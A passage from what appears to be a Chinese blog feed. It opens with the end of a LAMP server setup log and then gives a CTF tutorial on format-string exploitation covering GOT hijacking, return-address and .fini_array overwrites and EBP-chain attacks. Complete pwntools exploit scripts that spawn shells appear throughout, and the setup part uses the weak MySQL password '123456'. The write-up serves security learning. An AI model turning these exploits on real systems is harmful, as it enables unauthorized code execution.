srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# ps aux | grep mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# kill -9 102872[root@localhost mysql-5.5.23]# ps aux | grep mysqlmysql    103111  0.0  4.9 727288 49260 pts/3    Sl   03:39   0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306root     103201  0.0  0.0 112728   972 pts/2    S+   03:46   0:00 grep --color=auto mysql</code></pre><p>杀掉重新来。<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>成功了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="设置mysql密码"><a href="#设置mysql密码" class="headerlink" title="设置mysql密码"></a>设置mysql密码</h3><pre><code>[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot;[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>成功了。注意 <code>history -c</code> 清楚历史记录命令。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>服务都正常，字符集格式也在。</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="准备工作-2"><a href="#准备工作-2" class="headerlink" title="准备工作"></a>准备工作</h3><pre><code>[root@localhost mysql]# yum -y install libtool*[root@localhost local]# yum -y install libpng-devel</code></pre><p>让php支持数据库的内容：</p><pre><code>[root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="开始安装-1"><a href="#开始安装-1" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make install</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code>[root@localhost php-5.4.25]# mkdir /usr/local/php/etc[root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>复制主配置文件到<code>/usr/local/php/etc</code></p><pre><code>[root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>修改apache2配置，让其也可以支持php</p><p>重启apache2:</p><pre><code>[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stopAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message</code></pre><p>restart 可能是无效的。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h4 id="apache与php"><a href="#apache与php" class="headerlink" title="apache与php"></a>apache与php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost htdocs]# vi index.php</code></pre><p>写一个php探针：</p><pre><code>&lt;?php        phpinfo();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apache与MySQL"><a href="#apache与MySQL" class="headerlink" title="apache与MySQL"></a>apache与MySQL</h4><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);if($link) echo &quot;Congratulations!!!!!!&quot;;mysql_close();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadmin搭建"><a href="#phpadmin搭建" class="headerlink" title="phpadmin搭建"></a>phpadmin搭建</h3><pre><code>[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><pre><code>[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php[root@localhost phpmyadmin]# vi config.inc.php</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>访问测试：<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Lamp搭建记录&quot;&gt;&lt;a href=&quot;#Lamp搭建记录&quot; class=&quot;headerlink&quot; title=&quot;Lamp搭建记录&quot;&gt;&lt;/a&gt;Lamp搭建记录&lt;/h1&gt;&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞小总结（下）</title>
    <link href="http://chumen77.xyz/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/04/03/格式化字符串漏洞小总结（下）/</id>
    <published>2020-04-03T08:59:50.107Z</published>
    <updated>2020-06-27T14:27:05.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p><h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul><li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li><li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li><li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li><li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li><li>在栈上构造出printf函数GOT表的地址</li><li>利用fmt漏洞修改printf函数GOT表上的地址</li></ul><p>然后看一个例题：</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p><h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul><li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li><li>改这个GOT上的地址为system函数的plt</li><li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li></ul><p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p><h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p><h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p><ul><li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li><li>不开nx保护，jmp到自己构造的shellcode上。</li><li>提前泄漏libc算出libc的base，jmp到onegadget地址</li></ul><p>看一个简单的例子：</p><h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p><h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p><p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p><p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p><p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-84h]  char v5; // [esp+5Ch] [ebp-44h]  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(&amp;v5, 64) )    return puts(&quot;Don&#39;t ignore me ;( &quot;);  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);  return printf(&amp;s);}</code></pre><p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p><pre><code class="c">size_t __cdecl getnline(char *s, int n){  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);}</code></pre><p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p><ul><li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li><li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li><li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li></ul><p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p><h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p><pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre><p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./greeting&#39;)# io = remote(&#39;111.198.29.45&#39;,42729)elf = ELF(&#39;./greeting&#39;)strlen_got = 0x08049A54fini_array = 0x08049934start = 0x080484F0system_plt = 0x08048490offset = 12def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultkey1 = 0x08048490prev = 18 #注意这个题在可控格式化字符串前有字符输出payload = &quot;&quot;for i in range(2):    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xffffkey2 = 0x84F0for i in range(1):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x32,&#39;a&#39;)payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)io.recvuntil(&#39;name...&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;name...&#39;)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p><h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p><ul><li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li><li>sprintf：可以用%xxc 来造成新的buffer overflow </li></ul><h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul><li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li><li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li></ul><h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p><h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p><ul><li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li><li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li></ul><p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p><p>接下来看一个题来仔细分析一下</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p><p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p><pre><code>gdb-peda$ b *0x0804854FBreakpoint 1 at 0x804854f</code></pre><p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p><p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p><p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p><p>然后再看一个有点不一样的题目：</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p><h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" 